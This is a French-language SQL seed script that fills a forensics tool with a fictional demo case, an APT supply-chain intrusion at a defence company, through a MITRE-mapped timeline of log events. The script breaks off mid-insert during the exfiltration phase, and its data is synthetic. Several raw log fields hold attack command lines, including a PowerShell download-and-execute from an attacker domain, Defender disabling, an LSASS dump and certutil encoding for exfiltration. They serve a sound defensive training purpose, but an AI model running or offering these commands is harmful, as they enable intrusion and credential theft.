-- ═══════════════════════════════════════════════════════════════════════════
-- HEIMDALL DFIR — DEMO CASE "OPÉRATION DARK OLYMPUS"
-- Scénario : APT29 / Supply Chain Attack sur entreprise de défense
-- Généré pour démonstration — Mardi 2026-03-24
-- ═══════════════════════════════════════════════════════════════════════════

DO $$
DECLARE
  v_case_id     UUID;
  v_admin_id    UUID;
  v_analyst_id  UUID;
  v_ev1_id      UUID;  -- Disk image
  v_ev2_id      UUID;  -- Memory dump
  v_ev3_id      UUID;  -- EVTX logs (parsé → Super Timeline)
  v_ev4_id      UUID;  -- Network capture
  v_pr_id       UUID;  -- parser_results row
  v_pr2_id      UUID;  -- parser_results row (memory)
  v_cp_id       UUID;  -- case_playbooks id

BEGIN

  SELECT id INTO v_admin_id  FROM users WHERE username = 'admin'   LIMIT 1;
  SELECT id INTO v_analyst_id FROM users WHERE username = 'analyst' LIMIT 1;

  -- ── 0. Nettoyer si déjà existant ─────────────────────────────────────────
  DELETE FROM cases WHERE case_number = 'CASE-2026-DEMO';

  -- ── 1. Cas principal ──────────────────────────────────────────────────────
  INSERT INTO cases (
    case_number, title, description, status, priority,
    investigator_id, created_by, opened_at, report_deadline
  ) VALUES (
    'CASE-2026-DEMO',
    'DARK OLYMPUS — APT Supply Chain (Défense)',
    'Compromission APT détectée dans une entreprise du secteur défense (systèmes embarqués).' ||
    ' Vecteur initial : mise à jour trojanisée de 3CXDesktopApp (supply-chain similaire SolarWinds).' ||
    ' Présence estimée : 18 jours avant détection (2026-02-04 → 2026-02-22).' ||
    ' Objectif : exfiltration de documents R&D confidentiels (schémas systèmes embarqués, fiches classifiées).' ||
    ' Attribution : artefacts cohérents avec APT29 / Cozy Bear (TTPs MITRE, infrastructure C2, outils DAZZLESPY).',
    'active', 'critical',
    v_admin_id, v_admin_id,
    '2026-02-22 09:15:00+00',
    '2026-03-28 17:00:00+00'
  ) RETURNING id INTO v_case_id;

  -- ── 2. Preuves / Collectes ─────────────────────────────────────────────────
  INSERT INTO evidence (id, case_id, name, original_filename, file_size, evidence_type,
    hash_md5, hash_sha256, is_highlighted, notes, added_by, scan_status, created_at)
  VALUES
    (gen_random_uuid(), v_case_id,
     'LAPTOP-EXEC01_disk_2026-02-22.E01',
     'LAPTOP-EXEC01_disk_2026-02-22.E01',
     128849018880, -- 120 GB
     'disk',
     'a3f8e9d2c1b0f7e6', 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
     true,
     E'Image disque du poste victime (directeur technique).\nFormatée via FTK Imager en présence du DSI.\nHashs vérifiés x2.',
     v_admin_id, 'clean', '2026-02-22 11:30:00+00'),

    (gen_random_uuid(), v_case_id,
     'LAPTOP-EXEC01_memory_2026-02-22.raw',
     'LAPTOP-EXEC01_memory_2026-02-22.raw',
     17179869184, -- 16 GB RAM
     'memory',
     'b1c2d3e4f5a6b7c8', 'f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5',
     true,
     E'Dump mémoire live réalisé avec WinPmem 4.0.rc1.\nProcessus malveillants toujours actifs au moment de la capture.',
     v_admin_id, 'clean', '2026-02-22 10:45:00+00'),

    (gen_random_uuid(), v_case_id,
     'LAPTOP-EXEC01_evtx_2026-02-04-22.zip',
     'LAPTOP-EXEC01_evtx_2026-02-04-22.zip',
     2684354560, -- 2.5 GB
     'log',
     'd4e5f6a7b8c9d0e1', '9b71d224bd62f3785d96d46ad3ea3d73319bfbc2890caadae2dff72519673ca7',
     true,
     E'Journaux Windows Events exportés depuis Security.evtx, System.evtx, Application.evtx, PowerShell/Operational.evtx.\nPériode : 2026-01-01 → 2026-02-22.',
     v_analyst_id, 'clean', '2026-02-22 14:00:00+00'),

    (gen_random_uuid(), v_case_id,
     'pcap_wan_2026-02-04-18.pcapng',
     'pcap_wan_2026-02-04-18.pcapng',
     5368709120, -- 5 GB
     'network',
     'e5f6a7b8c9d0e1f2', '2c624232cdd221771294dfbb310acbc8f7ae9a3bb5c4f69d5b9476a3cef6b5a7',
     false,
     E'Capture réseau WAN issue du pare-feu Palo Alto PA-5250.\nPériode couverte: 2026-02-04 → 2026-02-18.\nFiltrage: subnet 10.0.0.0/8.',
     v_analyst_id, 'clean', '2026-02-23 09:00:00+00');

  -- Récupérer les IDs d'evidence par nom
  SELECT id INTO v_ev1_id FROM evidence WHERE name = 'LAPTOP-EXEC01_disk_2026-02-22.E01' AND case_id = v_case_id;
  SELECT id INTO v_ev2_id FROM evidence WHERE name = 'LAPTOP-EXEC01_memory_2026-02-22.raw' AND case_id = v_case_id;
  SELECT id INTO v_ev3_id FROM evidence WHERE name = 'LAPTOP-EXEC01_evtx_2026-02-04-22.zip' AND case_id = v_case_id;
  SELECT id INTO v_ev4_id FROM evidence WHERE name = 'pcap_wan_2026-02-04-18.pcapng' AND case_id = v_case_id;

  -- ── 3. Parser Results ─────────────────────────────────────────────────────
  INSERT INTO parser_results (id, case_id, evidence_id, parser_name, parser_version,
    record_count, created_at)
  VALUES
    (gen_random_uuid(), v_case_id, v_ev3_id,
     'Hayabusa + Zimmerman EVTX', '2.18.0',
     1847, '2026-02-22 14:05:00+00'),
    (gen_random_uuid(), v_case_id, v_ev1_id,
     'MFT + Prefetch + Registry + LNK', '2.18.0',
     3204, '2026-02-23 10:00:00+00');

  SELECT id INTO v_pr_id  FROM parser_results WHERE evidence_id = v_ev3_id AND case_id = v_case_id LIMIT 1;
  SELECT id INTO v_pr2_id FROM parser_results WHERE evidence_id = v_ev1_id AND case_id = v_case_id LIMIT 1;

  -- ── 4. Collection Timeline (Super Timeline) ───────────────────────────────
  -- PHASE 1 — Initial Access (2026-02-04 02:00 - 04:30) ─────────────────────
  INSERT INTO collection_timeline (case_id, evidence_id, result_id, timestamp, artifact_type,
    artifact_name, description, source, host_name, user_name, process_name,
    mitre_technique_id, mitre_technique_name, mitre_tactic, raw) VALUES

  -- Spear-phishing email opened
  (v_case_id, v_ev3_id, v_pr_id, '2026-02-04 01:52:33+00', 'evtx',
   'Security.evtx', 'Outlook.exe — Pièce jointe ouverte: "Contrat_Thales_Confidentiel_Feb2026.docx.exe"',
   'Security.evtx', 'LAPTOP-EXEC01', 'philippe.martin', 'OUTLOOK.EXE',
   'T1566.001', 'Spearphishing Attachment', 'initial-access',
   '{"EventID": 4688, "NewProcessName": "OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE /attachment"}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-04 01:53:07+00', 'evtx',
   'Security.evtx', 'WINWORD.EXE — Ouverture document avec macro (Auto_Open activée)',
   'Security.evtx', 'LAPTOP-EXEC01', 'philippe.martin', 'WINWORD.EXE',
   'T1566.001', 'Spearphishing Attachment', 'initial-access',
   '{"EventID": 4688, "NewProcessName": "WINWORD.EXE", "ParentProcess": "OUTLOOK.EXE"}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-04 01:53:19+00', 'hayabusa',
   '[CRITICAL] Macro Office spawning PowerShell',
   '⚠ CRITIQUE: WINWORD.EXE a spawné powershell.exe — vecteur d''infection macro Office classique',
   'Hayabusa v2.18', 'LAPTOP-EXEC01', 'philippe.martin', 'powershell.exe',
   'T1059.001', 'PowerShell', 'execution',
   '{"level": "critical", "ruleid": "HAYABUSA-PS-SPAWN-OFFICE", "alert": "Office macro spawning PowerShell"}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-04 01:53:21+00', 'evtx',
   'PowerShell/Operational.evtx', 'PowerShell - Script Block Logging: téléchargement stager depuis C2',
   'PowerShell/Operational.evtx', 'LAPTOP-EXEC01', 'philippe.martin', 'powershell.exe',
   'T1059.001', 'PowerShell', 'execution',
   '{"EventID": 4104, "ScriptBlock": "IEX(New-Object Net.WebClient).DownloadString(\"https://update.3cx-cdn.net/payload\")"}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-04 01:54:02+00', 'evtx',
   'Security.evtx', '3CXDesktopApp.exe lancé depuis %TEMP% — binaire trojanisé identifié',
   'Security.evtx', 'LAPTOP-EXEC01', 'philippe.martin', '3CXDesktopApp.exe',
   'T1195.002', 'Compromise Software Supply Chain', 'initial-access',
   '{"EventID": 4688, "NewProcessName": "C:\\Users\\philippe.martin\\AppData\\Local\\Temp\\3CXDesktopApp.exe"}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-04 01:54:02+00', 'prefetch',
   '3CXDESKTOPAPP.EXE-{A3F891B2}.pf',
   '3CXDesktopApp.exe — 1ère exécution (Run Count: 1)',
   'C:\Windows\Prefetch', 'LAPTOP-EXEC01', 'philippe.martin', '3CXDesktopApp.exe',
   'T1195.002', 'Compromise Software Supply Chain', 'initial-access',
   '{"RunCount": 1, "LastRun": "2026-02-04T01:54:02", "Path": "C:\\Users\\philippe.martin\\AppData\\Local\\Temp\\3CXDesktopApp.exe"}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-04 01:54:15+00', 'hayabusa',
   '[HIGH] Suspicious 3CX DLL Side-loading',
   '⚠ ÉLEVÉ: DLL side-loading détecté — d3dcompiler_47.dll chargée depuis le répertoire de 3CXDesktopApp',
   'Hayabusa v2.18', 'LAPTOP-EXEC01', 'philippe.martin', '3CXDesktopApp.exe',
   'T1574.002', 'DLL Side-Loading', 'defense-evasion',
   '{"level": "high", "ruleid": "HAYABUSA-DLL-SIDELOAD", "DLL": "d3dcompiler_47.dll"}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-04 01:55:30+00', 'evtx',
   'Security.evtx', 'rundll32.exe — exécution payload shellcode via d3dcompiler_47.dll',
   'Security.evtx', 'LAPTOP-EXEC01', 'philippe.martin', 'rundll32.exe',
   'T1218.011', 'Rundll32', 'defense-evasion',
   '{"EventID": 4688, "NewProcessName": "rundll32.exe", "CommandLine": "rundll32.exe d3dcompiler_47.dll,#1"}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-04 01:56:44+00', 'evtx',
   'Security.evtx', 'Connexion réseau sortante vers 162.159.135.233:443 (Cloudflare — C2 via CDN)',
   'Security.evtx', 'LAPTOP-EXEC01', 'philippe.martin', 'rundll32.exe',
   'T1071.001', 'Web Protocols C2', 'command-and-control',
   '{"EventID": 5156, "Application": "rundll32.exe", "DestAddress": "162.159.135.233", "DestPort": 443}'),

  -- PHASE 2 — Persistence (2026-02-04 02:00 - 06:00) ───────────────────────
  (v_case_id, v_ev3_id, v_pr_id, '2026-02-04 02:03:11+00', 'evtx',
   'Security.evtx', 'Tâche planifiée créée: "\\Microsoft\\Windows\\SyncCenter\\SyncProvider" (persistance)',
   'Security.evtx', 'LAPTOP-EXEC01', 'philippe.martin', 'schtasks.exe',
   'T1053.005', 'Scheduled Task', 'persistence',
   '{"EventID": 4698, "TaskName": "\\Microsoft\\Windows\\SyncCenter\\SyncProvider", "Trigger": "AtLogon"}'),

  (v_case_id, v_ev2_id, v_pr2_id, '2026-02-04 02:04:22+00', 'registry',
   'HKCU\Software\Microsoft\Windows\CurrentVersion\Run',
   'Clé Run ajoutée: SyncCenter → C:\ProgramData\SyncProvider\svchost32.exe',
   'NTUSER.DAT — philippe.martin', 'LAPTOP-EXEC01', 'philippe.martin', 'reg.exe',
   'T1547.001', 'Registry Run Keys', 'persistence',
   '{"Key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Value": "SyncCenter", "Data": "C:\\ProgramData\\SyncProvider\\svchost32.exe -k netsvcs"}'),

  (v_case_id, v_ev2_id, v_pr2_id, '2026-02-04 02:05:10+00', 'mft',
   'C:\ProgramData\SyncProvider\svchost32.exe',
   'Fichier créé: svchost32.exe (8.2 MB) — backdoor DAZZLESPY implanté',
   'C:\ProgramData\SyncProvider\', 'LAPTOP-EXEC01', 'SYSTEM', 'rundll32.exe',
   'T1036.005', 'Match Legitimate Name or Location', 'defense-evasion',
   '{"FileName": "svchost32.exe", "FileSize": 8597504, "Created": "2026-02-04T02:05:10", "MD5": "4a5f6b7c8d9e0f1a"}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-04 02:07:45+00', 'evtx',
   'System.evtx', 'Service installé: "SyncProvider Network Service" (SYSTEM) — persistance via service',
   'System.evtx', 'LAPTOP-EXEC01', 'SYSTEM', 'svchost32.exe',
   'T1543.003', 'Windows Service', 'persistence',
   '{"EventID": 7045, "ServiceName": "SyncProviderSvc", "ServiceFileName": "C:\\ProgramData\\SyncProvider\\svchost32.exe", "StartType": "Auto"}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-04 02:10:33+00', 'hayabusa',
   '[CRITICAL] WMI Subscription Created — Persistence',
   '⚠ CRITIQUE: Abonnement WMI permanent créé — EventFilter + EventConsumer + FilterToConsumerBinding',
   'Hayabusa v2.18', 'LAPTOP-EXEC01', 'SYSTEM', 'wmiprvse.exe',
   'T1546.003', 'WMI Event Subscription', 'persistence',
   '{"level": "critical", "EventFilter": "NtdllHook", "Consumer": "CommandLineEventConsumer", "Command": "C:\\ProgramData\\SyncProvider\\svchost32.exe"}'),

  (v_case_id, v_ev2_id, v_pr2_id, '2026-02-04 02:12:00+00', 'registry',
   'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
   'UserInit modifié: ajout de svchost32.exe au processus de logon Winlogon',
   'SOFTWARE hive', 'LAPTOP-EXEC01', 'SYSTEM', NULL,
   'T1547.004', 'Winlogon Helper DLL', 'persistence',
   '{"Key": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "OldValue": "userinit.exe", "NewValue": "userinit.exe, C:\\ProgramData\\SyncProvider\\svchost32.exe"}'),

  -- PHASE 3 — Defense Evasion (2026-02-04 02:15 - 03:00) ───────────────────
  (v_case_id, v_ev3_id, v_pr_id, '2026-02-04 02:17:22+00', 'evtx',
   'PowerShell/Operational.evtx', 'PowerShell — Désactivation Windows Defender via Set-MpPreference',
   'PowerShell/Operational.evtx', 'LAPTOP-EXEC01', 'SYSTEM', 'powershell.exe',
   'T1562.001', 'Disable/Modify Tools', 'defense-evasion',
   '{"EventID": 4104, "ScriptBlock": "Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -ExclusionPath C:\\ProgramData\\SyncProvider"}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-04 02:18:44+00', 'evtx',
   'Security.evtx', 'Journaux d''audit effacés: Security.evtx (4372 entrées supprimées)',
   'Security.evtx', 'LAPTOP-EXEC01', 'SYSTEM', 'wevtutil.exe',
   'T1070.001', 'Clear Windows Event Logs', 'defense-evasion',
   '{"EventID": 1102, "SubjectUserName": "SYSTEM", "LogName": "Security"}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-04 02:19:05+00', 'hayabusa',
   '[CRITICAL] Event Log Cleared',
   '⚠ CRITIQUE: Journal Security.evtx effacé — tentative de dissimulation des traces d''intrusion',
   'Hayabusa v2.18', 'LAPTOP-EXEC01', 'SYSTEM', 'wevtutil.exe',
   'T1070.001', 'Clear Windows Event Logs', 'defense-evasion',
   '{"level": "critical", "EventID": 1102, "SubjectDomainName": "THALES-CORP"}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-04 02:21:18+00', 'evtx',
   'Security.evtx', 'Timestamps NTFS modifiés via SetFileTime() — anti-forensique',
   'Security.evtx', 'LAPTOP-EXEC01', 'SYSTEM', 'svchost32.exe',
   'T1070.006', 'Timestomp', 'defense-evasion',
   '{"EventID": 4663, "ObjectName": "C:\\ProgramData\\SyncProvider\\svchost32.exe", "AccessMask": "0x4"}'),

  -- PHASE 4 — Discovery (2026-02-04 03:00 - 2026-02-05 08:00) ──────────────
  (v_case_id, v_ev3_id, v_pr_id, '2026-02-04 03:10:22+00', 'evtx',
   'Security.evtx', 'net.exe — énumération des groupes du domaine (Domain Admins, Enterprise Admins)',
   'Security.evtx', 'LAPTOP-EXEC01', 'philippe.martin', 'net.exe',
   'T1069.002', 'Domain Groups', 'discovery',
   '{"EventID": 4688, "CommandLine": "net group \"Domain Admins\" /domain"}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-04 03:11:45+00', 'prefetch',
   'NET.EXE-{C7A02190}.pf',
   'net.exe exécuté 14 fois — énumération AD intensive',
   'C:\Windows\Prefetch', 'LAPTOP-EXEC01', 'philippe.martin', 'net.exe',
   'T1069.002', 'Domain Groups', 'discovery',
   '{"RunCount": 14, "LastRun": "2026-02-04T03:11:45"}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-04 03:14:02+00', 'evtx',
   'Security.evtx', 'nltest.exe — découverte des contrôleurs de domaine: WIN-DC01.thales-corp.local',
   'Security.evtx', 'LAPTOP-EXEC01', 'philippe.martin', 'nltest.exe',
   'T1018', 'Remote System Discovery', 'discovery',
   '{"EventID": 4688, "CommandLine": "nltest /dclist:thales-corp.local", "Output": "WIN-DC01.thales-corp.local"}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-04 03:18:33+00', 'evtx',
   'Security.evtx', 'AdFind.exe — requêtes LDAP massives sur l''Active Directory (1 432 objets collectés)',
   'Security.evtx', 'LAPTOP-EXEC01', 'philippe.martin', 'AdFind.exe',
   'T1087.002', 'Domain Account', 'discovery',
   '{"EventID": 4688, "NewProcessName": "AdFind.exe", "CommandLine": "AdFind -f \"objectCategory=person\" > C:\\Temp\\users.txt"}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-04 03:22:17+00', 'prefetch',
   'ADFIND.EXE-{F1E2D3C4}.pf',
   'AdFind.exe — outil de reconnaissance AD (non présent sur ce poste avant l''incident)',
   'C:\Windows\Prefetch', 'LAPTOP-EXEC01', 'philippe.martin', 'AdFind.exe',
   'T1087.002', 'Domain Account', 'discovery',
   '{"RunCount": 3, "FirstRun": "2026-02-04T03:18:33", "Dropped": true}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-04 03:35:44+00', 'evtx',
   'Security.evtx', 'systeminfo.exe + ipconfig /all — collecte d''informations système complète',
   'Security.evtx', 'LAPTOP-EXEC01', 'philippe.martin', 'systeminfo.exe',
   'T1082', 'System Information Discovery', 'discovery',
   '{"EventID": 4688, "CommandLine": "systeminfo > C:\\Temp\\sysinfo.txt"}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-04 04:02:11+00', 'evtx',
   'Security.evtx', 'arp -a, route print — cartographie du réseau local (subnet 10.0.0.0/8)',
   'Security.evtx', 'LAPTOP-EXEC01', 'philippe.martin', 'cmd.exe',
   'T1016', 'System Network Configuration Discovery', 'discovery',
   '{"EventID": 4688, "CommandLine": "for /L %i in (1,1,254) do @ping -n 1 -w 50 10.0.1.%i"}'),

  -- Recon réseau avec nmap / portscan
  (v_case_id, v_ev3_id, v_pr_id, '2026-02-04 04:15:00+00', 'evtx',
   'Security.evtx', 'Scan réseau interne via nmap.exe — 10.0.0.0/16 ports 22,80,443,445,3389',
   'Security.evtx', 'LAPTOP-EXEC01', 'philippe.martin', 'nmap.exe',
   'T1046', 'Network Service Discovery', 'discovery',
   '{"EventID": 4688, "CommandLine": "nmap -sV -p 22,80,443,445,3389 10.0.0.0/16 -oA C:\\Temp\\scan"}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-04 04:18:02+00', 'prefetch',
   'NMAP.EXE-{D2E3F4A5}.pf',
   'nmap.exe — outil de scan réseau non-légitime exécuté sur ce poste',
   'C:\Windows\Prefetch', 'LAPTOP-EXEC01', 'philippe.martin', 'nmap.exe',
   'T1046', 'Network Service Discovery', 'discovery',
   '{"RunCount": 2, "FirstRun": "2026-02-04T04:15:00"}'),

  -- PHASE 5 — Credential Access (2026-02-05 14:00 - 2026-02-06 00:00) ───────
  (v_case_id, v_ev3_id, v_pr_id, '2026-02-05 14:02:33+00', 'hayabusa',
   '[CRITICAL] LSASS Memory Dump via ProcDump',
   '⚠ CRITIQUE: procdump64.exe a accédé à lsass.exe — dump des credentials en mémoire (Mimikatz-style)',
   'Hayabusa v2.18', 'LAPTOP-EXEC01', 'SYSTEM', 'procdump64.exe',
   'T1003.001', 'LSASS Memory', 'credential-access',
   '{"level": "critical", "SourceImage": "procdump64.exe", "TargetImage": "lsass.exe", "GrantedAccess": "0x1fffff"}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-05 14:03:15+00', 'evtx',
   'Security.evtx', 'Accès LSASS par processus non-système: procdump64.exe (PID 9432 → lsass.exe PID 712)',
   'Security.evtx', 'LAPTOP-EXEC01', 'SYSTEM', 'procdump64.exe',
   'T1003.001', 'LSASS Memory', 'credential-access',
   '{"EventID": 10, "SourceProcessId": 9432, "TargetProcessId": 712, "GrantedAccess": "0x1FFFFF"}'),

  (v_case_id, v_ev2_id, v_pr2_id, '2026-02-05 14:05:45+00', 'mft',
   'C:\Temp\lsass_dump.dmp',
   'Fichier créé: lsass_dump.dmp (28.4 MB) — dump mémoire lsass',
   'C:\Temp\', 'LAPTOP-EXEC01', 'SYSTEM', 'procdump64.exe',
   'T1003.001', 'LSASS Memory', 'credential-access',
   '{"FileName": "lsass_dump.dmp", "FileSize": 29777920, "Created": "2026-02-05T14:05:45"}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-05 14:12:00+00', 'hayabusa',
   '[CRITICAL] Mimikatz Execution Detected',
   '⚠ CRITIQUE: Signatures Mimikatz détectées — extraction de credentials NTLM depuis lsass.dmp',
   'Hayabusa v2.18', 'LAPTOP-EXEC01', 'SYSTEM', 'powershell.exe',
   'T1003.001', 'LSASS Memory', 'credential-access',
   '{"level": "critical", "rule": "Mimikatz-sekurlsa-logonpasswords", "Output": "Credentials extracted for 8 accounts"}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-05 14:25:11+00', 'evtx',
   'Security.evtx', 'Pass-the-Hash détecté: connexion NTLM type 3 sans Kerberos (compte: svc_backup)',
   'Security.evtx', 'LAPTOP-EXEC01', 'svc_backup', 'cmd.exe',
   'T1550.002', 'Pass the Hash', 'lateral-movement',
   '{"EventID": 4624, "LogonType": 3, "AuthPackage": "NTLM", "WorkstationName": "LAPTOP-EXEC01", "TargetUserName": "svc_backup"}'),

  -- PHASE 6 — Lateral Movement (2026-02-05 14:30 - 2026-02-07) ─────────────
  (v_case_id, v_ev3_id, v_pr_id, '2026-02-05 14:31:22+00', 'evtx',
   'Security.evtx', 'Connexion RDP depuis LAPTOP-EXEC01 vers WIN-FILESERVER01 (10.0.2.10) — compte svc_backup',
   'Security.evtx', 'LAPTOP-EXEC01', 'svc_backup', 'mstsc.exe',
   'T1021.001', 'Remote Desktop Protocol', 'lateral-movement',
   '{"EventID": 4648, "TargetServerName": "WIN-FILESERVER01", "TargetUserName": "svc_backup", "LogonType": 10}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-05 14:33:00+00', 'prefetch',
   'MSTSC.EXE-{E3F4A5B6}.pf',
   'mstsc.exe (RDP) — connexion vers WIN-FILESERVER01 et WIN-DC01',
   'C:\Windows\Prefetch', 'LAPTOP-EXEC01', 'svc_backup', 'mstsc.exe',
   'T1021.001', 'Remote Desktop Protocol', 'lateral-movement',
   '{"RunCount": 8, "Connections": ["WIN-FILESERVER01", "WIN-DC01", "WIN-BACKUP01"]}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-05 15:10:44+00', 'evtx',
   'Security.evtx', 'PsExec.exe — exécution à distance sur WIN-DC01 via partage ADMIN$',
   'Security.evtx', 'WIN-DC01', 'svc_backup', 'PSEXESVC.EXE',
   'T1021.002', 'SMB/Windows Admin Shares', 'lateral-movement',
   '{"EventID": 7045, "ServiceName": "PSEXESVC", "ServiceFileName": "%SystemRoot%\\PSEXESVC.exe", "Source": "LAPTOP-EXEC01"}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-05 15:15:30+00', 'hayabusa',
   '[HIGH] PsExec Service Installation on Domain Controller',
   '⚠ ÉLEVÉ: PsExec installé comme service sur le DC — mouvement latéral vers infrastructure critique',
   'Hayabusa v2.18', 'WIN-DC01', 'svc_backup', 'PSEXESVC.EXE',
   'T1021.002', 'SMB/Windows Admin Shares', 'lateral-movement',
   '{"level": "high", "TargetHost": "WIN-DC01", "SourceHost": "LAPTOP-EXEC01"}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-05 15:22:08+00', 'evtx',
   'Security.evtx', 'Backdoor déployé sur WIN-DC01: C:\Windows\System32\wbem\WmiPrvSE2.exe',
   'Security.evtx', 'WIN-DC01', 'SYSTEM', 'PSEXESVC.EXE',
   'T1105', 'Ingress Tool Transfer', 'command-and-control',
   '{"EventID": 4688, "NewProcessName": "C:\\Windows\\System32\\wbem\\WmiPrvSE2.exe", "CommandLine": "cmd /c copy \\\\LAPTOP-EXEC01\\C$\\ProgramData\\SyncProvider\\svchost32.exe"}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-06 09:14:22+00', 'evtx',
   'Security.evtx', 'Connexion RDP vers WIN-BACKUP01 (10.0.3.5) — Serveur de sauvegarde',
   'Security.evtx', 'WIN-DC01', 'admin', 'mstsc.exe',
   'T1021.001', 'Remote Desktop Protocol', 'lateral-movement',
   '{"EventID": 4648, "TargetServerName": "WIN-BACKUP01", "TargetUserName": "admin"}'),

  -- PHASE 7 — Collection & Staging (2026-02-07 - 2026-02-10) ───────────────
  (v_case_id, v_ev2_id, v_pr2_id, '2026-02-07 22:31:04+00', 'lnk',
   'C:\Users\philippe.martin\AppData\Roaming\Microsoft\Windows\Recent\PROJET_ATHENA_v3.2_CONFIDENTIEL.lnk',
   'Fichier LNK: accès récent au document PROJET_ATHENA_v3.2_CONFIDENTIEL.pdf',
   'NTUSER.DAT Recent Files', 'LAPTOP-EXEC01', 'philippe.martin', NULL,
   'T1005', 'Data from Local System', 'collection',
   '{"TargetPath": "D:\\Documents\\Projets\\PROJET_ATHENA_v3.2_CONFIDENTIEL.pdf", "AccessedTime": "2026-02-07T22:31:04"}'),

  (v_case_id, v_ev2_id, v_pr2_id, '2026-02-07 22:32:15+00', 'lnk',
   'C:\Users\philippe.martin\AppData\Roaming\Microsoft\Windows\Recent\SPECIF_TECH_SYSTEME_EMBARQUE_2026.lnk',
   'Fichier LNK: accès récent au document SPECIF_TECH_SYSTEME_EMBARQUE_2026.docx',
   'NTUSER.DAT Recent Files', 'LAPTOP-EXEC01', 'philippe.martin', NULL,
   'T1005', 'Data from Local System', 'collection',
   '{"TargetPath": "D:\\Documents\\RD\\SPECIF_TECH_SYSTEME_EMBARQUE_2026.docx", "AccessedTime": "2026-02-07T22:32:15"}'),

  (v_case_id, v_ev2_id, v_pr2_id, '2026-02-07 22:33:40+00', 'lnk',
   'C:\Users\philippe.martin\AppData\Roaming\Microsoft\Windows\Recent\PLANS_CIRCUIT_CAPTEUR_IR_SECRET.lnk',
   'Fichier LNK: accès récent au document PLANS_CIRCUIT_CAPTEUR_IR_SECRET.pdf',
   'NTUSER.DAT Recent Files', 'LAPTOP-EXEC01', 'philippe.martin', NULL,
   'T1005', 'Data from Local System', 'collection',
   '{"TargetPath": "D:\\Documents\\RD\\Capteurs\\PLANS_CIRCUIT_CAPTEUR_IR_SECRET.pdf", "AccessedTime": "2026-02-07T22:33:40"}'),

  (v_case_id, v_ev2_id, v_pr2_id, '2026-02-08 02:14:33+00', 'mft',
   'C:\Temp\exfil\docs_batch1.7z',
   'Fichier créé: docs_batch1.7z (847 MB) — archive chiffrée contenant documents R&D',
   'C:\Temp\exfil\', 'LAPTOP-EXEC01', 'SYSTEM', '7z.exe',
   'T1560.001', 'Archive via Utility', 'collection',
   '{"FileName": "docs_batch1.7z", "FileSize": 887947264, "Created": "2026-02-08T02:14:33", "EncryptionKey": "-p [REDACTED]"}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-08 02:15:00+00', 'evtx',
   'Security.evtx', '7z.exe — compression et chiffrement AES-256 de 3 247 fichiers vers docs_batch1.7z',
   'Security.evtx', 'LAPTOP-EXEC01', 'SYSTEM', '7z.exe',
   'T1560.001', 'Archive via Utility', 'collection',
   '{"EventID": 4688, "CommandLine": "7z.exe a -tzip -p[PASSWORD] -mhe=on C:\\Temp\\exfil\\docs_batch1.7z D:\\Documents\\"}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-08 02:45:12+00', 'prefetch',
   '7Z.EXE-{F1A2B3C4}.pf',
   '7z.exe exécuté 6 fois (nuit du 07-08/02) — staging massif de données',
   'C:\Windows\Prefetch', 'LAPTOP-EXEC01', 'SYSTEM', '7z.exe',
   'T1560.001', 'Archive via Utility', 'collection',
   '{"RunCount": 6, "FirstRun": "2026-02-08T02:14:33", "TotalFilesProcessed": 3247}'),

  (v_case_id, v_ev2_id, v_pr2_id, '2026-02-08 03:22:44+00', 'mft',
   'C:\Temp\exfil\docs_batch2.7z',
   'Fichier créé: docs_batch2.7z (1.2 GB) — 2ème lot de documents classifiés',
   'C:\Temp\exfil\', 'LAPTOP-EXEC01', 'SYSTEM', '7z.exe',
   'T1560.001', 'Archive via Utility', 'collection',
   '{"FileName": "docs_batch2.7z", "FileSize": 1288490188, "Created": "2026-02-08T03:22:44"}'),

  -- PHASE 8 — Exfiltration (2026-02-10 - 2026-02-18) ────────────────────────
  (v_case_id, v_ev3_id, v_pr_id, '2026-02-10 02:14:22+00', 'evtx',
   'Security.evtx', 'certutil.exe — encodage base64 des archives pour transport DNS',
   'Security.evtx', 'LAPTOP-EXEC01', 'SYSTEM', 'certutil.exe',
   'T1048.003', 'Exfiltration Over DNS', 'exfiltration',
   '{"EventID": 4688, "CommandLine": "certutil -encodehex C:\\Temp\\exfil\\docs_batch1.7z C:\\Temp\\encoded.txt 12"}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-10 02:20:00+00', 'hayabusa',
